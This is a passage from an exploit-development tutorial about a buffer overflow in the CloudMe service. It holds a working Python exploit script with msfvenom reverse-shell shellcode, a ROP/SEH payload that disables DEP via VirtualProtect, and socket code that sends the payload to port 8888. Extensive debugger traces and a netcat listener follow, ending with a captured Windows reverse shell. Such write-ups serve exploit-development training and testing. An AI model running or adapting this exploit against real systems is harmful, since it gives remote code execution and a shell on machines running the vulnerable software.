buf += b"\xdb\xdc\xd9\x74\x24\xf4\xb8\x81\xf1\x20\xb2\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\xc3\xe2\xc2"
buf += b"\x47\x3f\xec\x81\xa8\xbf\xed\xe5\x21\x5a\xdc\x25\x55"
buf += b"\x2f\x4f\x96\x1d\x7d\x7c\x5d\x73\x95\xf7\x13\x5c\x9a"
buf += b"\xb0\x9e\xba\x95\x41\xb2\xff\xb4\xc1\xc9\xd3\x16\xfb"
buf += b"\x01\x26\x57\x3c\x7f\xcb\x05\x95\x0b\x7e\xb9\x92\x46"
buf += b"\x43\x32\xe8\x47\xc3\xa7\xb9\x66\xe2\x76\xb1\x30\x24"
buf += b"\x79\x16\x49\x6d\x61\x7b\x74\x27\x1a\x4f\x02\xb6\xca"
buf += b"\x81\xeb\x15\x33\x2e\x1e\x67\x74\x89\xc1\x12\x8c\xe9"
buf += b"\x7c\x25\x4b\x93\x5a\xa0\x4f\x33\x28\x12\xab\xc5\xfd"
buf += b"\xc5\x38\xc9\x4a\x81\x66\xce\x4d\x46\x1d\xea\xc6\x69"
buf += b"\xf1\x7a\x9c\x4d\xd5\x27\x46\xef\x4c\x82\x29\x10\x8e"
buf += b"\x6d\x95\xb4\xc5\x80\xc2\xc4\x84\xcc\x27\xe5\x36\x0d"
buf += b"\x20\x7e\x45\x3f\xef\xd4\xc1\x73\x78\xf3\x16\x73\x53"
buf += b"\x43\x88\x8a\x5c\xb4\x81\x48\x08\xe4\xb9\x79\x31\x6f"
buf += b"\x39\x85\xe4\x20\x69\x29\x57\x81\xd9\x89\x07\x69\x33"
buf += b"\x06\x77\x89\x3c\xcc\x10\x20\xc7\x87\xde\x1d\x0e\x50"
buf += b"\xb7\x5f\x90\x5e\xfc\xe9\x76\x0a\x12\xbc\x21\xa3\x8b"
buf += b"\xe5\xb9\x52\x53\x30\xc4\x55\xdf\xb7\x39\x1b\x28\xbd"
buf += b"\x29\xcc\xd8\x88\x13\x5b\xe6\x26\x3b\x07\x75\xad\xbb"
buf += b"\x4e\x66\x7a\xec\x07\x58\x73\x78\xba\xc3\x2d\x9e\x47"
buf += b"\x95\x16\x1a\x9c\x66\x98\xa3\x51\xd2\xbe\xb3\xaf\xdb"
buf += b"\xfa\xe7\x7f\x8a\x54\x51\xc6\x64\x17\x0b\x90\xdb\xf1"
buf += b"\xdb\x65\x10\xc2\x9d\x69\x7d\xb4\x41\xdb\x28\x81\x7e"
buf += b"\xd4\xbc\x05\x07\x08\x5d\xe9\xd2\x88\x7d\x08\xf6\xe4"
buf += b"\x15\x95\x93\x44\x78\x26\x4e\x8a\x85\xa5\x7a\x73\x72"
buf += b"\xb5\x0f\x76\x3e\x71\xfc\x0a\x2f\x14\x02\xb8\x50\x3d"

##########

junk1 = "\x41"*1604

nops = "\x90"*16

junk2 = "C"*(2236 - len(nops) - len(buf) - len(rop) - len(junk1))

seh = struct.pack('L',0x6998fb2e) # ADD ESP,76C # POP EBX # POP ESI # POP EDI # POP EBP # RETN [Qt5Network.dll]

payload = junk1 + rop + nops + buf + junk2 + seh

try:
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((target,8888))
   s.send(payload)
except Exception as e:
   print(sys.exc_value)
```

<p align="justify">
Now, after running the exploit, we can see step by step in the debugger the values of the registers
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> bp 0x68ef1b07
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll - 
0:000> bl
0 e 68ef1b07 0001 (0001) 0:**** Qt5Core!ZN8qfloat1613mantissatableE+0x61e7
0:000> g
Breakpoint 0 hit
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll - 
eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
eip=68ef1b07 esp=0022d704 ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
Qt5Core!ZN8qfloat1613mantissatableE+0x61e7:
68ef1b07 60 pushad
0:000> dds esp-70
0022d694 699012c9 Qt5Network+0x12c9
0022d698 0385ff88
0022d69c 68a9559e Qt5Core!Z21qt_logging_to_consolev+0x8e
0022d6a0 68ae4fe3 Qt5Core!ZNK15QDateTimeParser12parseSectionERK9QDateTimeiR7QStringRiiRNS_5StateEPi+0xdf3
0022d6a4 0362fffc
0022d6a8 68ad422b Qt5Core!ZNK5QTime4hourEv+0x1b
0022d6ac 68ae8a22 Qt5Core!ZNK12QEasingCurve4typeEv+0x2
0022d6b0 68a812c9 Qt5Core+0x12c9
0022d6b4 fffae493
0022d6b8 61ba8137 Qt5Gui!ZN7QWindow4setXEi+0x77
0022d6bc 6d9c23ab Qt5Sql!ZN9QSqlQuery6finishEv+0x1b
0022d6c0 6d9c1011 Qt5Sql+0x1011
0022d6c4 61b63b3c Qt5Gui!ZNK6QImage10rgbSwappedEv+0x1dabc
0022d6c8 68d327ff Qt5Core!ZN16QEventTransition11qt_metacallEN11QMetaObject4CallEiPPv+0x4f29f
0022d6cc ffffffc0
0022d6d0 41414141
0022d6d4 68cef5b2 Qt5Core!ZN16QEventTransition11qt_metacallEN11QMetaObject4CallEiPPv+0xc052
0022d6d8 68b1df17 Qt5Core!ZNK7QString7sectionERKS_ii6QFlagsINS_11SectionFlagEE+0x157
0022d6dc 68ae7ee3 Qt5Core!ZNK15QDateTimeParser10fromStringERK7QStringP5QDateP5QTime+0x823
0022d6e0 fffffdff
0022d6e4 6d9e431a Qt5Sql!ZN24QSqlRelationalTableModel11qt_metacallEN11QMetaObject4CallEiPPv+0x28a
0022d6e8 68aad07c Qt5Core!ZN9QBitArrayaNERKS_+0x19c
0022d6ec 6d9c12c9 Qt5Sql+0x12c9
0022d6f0 6d9c12c9 Qt5Sql+0x12c9
0022d6f4 6fe4dc57 libstdc___6!_gcclibcxx_demangle_callback+0xec7
0022d6f8 90909090
0022d6fc 68ee6b16 Qt5Core!ZN13QStateMachine16staticMetaObjectE+0x11aa
0022d700 68ef1b07 Qt5Core!ZN8qfloat1613mantissatableE+0x61e7
0022d704 64b4d6cd libwinpthread_1!pthread_detach+0xd
0022d708 90909090
0022d70c 90909090
0022d710 90909090
</pre>

<p align="justify">
As we see, after the <b>PUSHAD</b> instruction is executed, all of the registers are pushed on the stack in specific order that is necessary to successfully execute the <b>VirtualProtect</b>. If we continue the execution, we enter the <b>kernel32!VirtualProtect</b> function and disable DEP for the memory region just below the <b>PUSHAD</b> ROP chain:
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
eip=762a20d8 esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
kernel32!VirtualProtect:
762a20d8 ff2524192a76 jmp dword ptr [kernel32!_imp__VirtualProtect (762a1924)] ds:0023:762a1924={KERNELBASE!VirtualProtect (75a522bd)}
0:000> 
eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
eip=75a522bd esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
KERNELBASE!VirtualProtect:
75a522bd 8bff mov edi,edi
0:000> 
eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
eip=75a522bf esp=0022d6ec ebp=6d9c12c9 iopl=0 nv up ei pl nz ac po cy
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213
KERNELBASE!VirtualProtect+0x2:
75a522bf 55 push ebp
[..snip..]
</pre>

<p align="justify">
If we still continue the execution we can see below that now is possible to execute commands on the stack:
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
[..snip..]
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=64b4d6cd esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
libwinpthread_1!pthread_detach+0xd:
64b4d6cd ffe4 jmp esp {0022d708}
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d708 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d708 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d709 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d709 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d70a esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d70a 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d70b esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d70b 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d70c esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d70c 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d70d esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d70d 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d70e esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d70e 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d70f esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d70f 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d710 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d710 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d711 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d711 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d712 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d712 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d713 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d713 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d714 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d714 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d715 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d715 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d716 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d716 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d717 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d717 90 nop
0:000> 
eax=00000001 ebx=00000201 ecx=00000001 edx=ffffffff esi=766b20d8 edi=6d9c1011
eip=0022d718 esp=0022d708 ebp=90909090 iopl=0 nv up ei pl nz na po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
0022d718 <span style="color:#ff0000;">dbdc </span>fcmovnu st,st(4)
[..snip..]
</pre>


<p align="justify">
And yes, as we see above, we have started executing the NOP sled stored in EAX. Also, we can see in red above that we have moved to the beginning of our shellcode ( compare with the first 2 bytes of the msfvenom shellcode ).&nbsp; At this point we are ready to connect to the target machine and have a shell.
</p>

* * *

### 9.&nbsp; Spawning a Shell

<p align="justify">
Before running the exploit script above we have first run our listener on port 443&nbsp;
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
nv -nlvp 443
</pre>

After running the script we will have our shell&nbsp;

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~</b></span># nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.201.7] from (UNKNOWN) [192.168.201.88] 49900
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe>
</pre>



